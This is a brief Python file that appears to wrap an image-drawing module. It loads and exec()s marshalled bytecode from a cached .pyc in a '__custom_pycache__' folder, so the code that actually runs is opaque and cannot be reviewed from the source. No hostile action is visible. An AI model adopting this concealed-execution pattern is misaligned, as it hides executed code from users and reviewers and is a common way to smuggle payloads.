
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'ImageDrawBoxes_cf4625b9a41944f2aa8c1fabdb483037.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
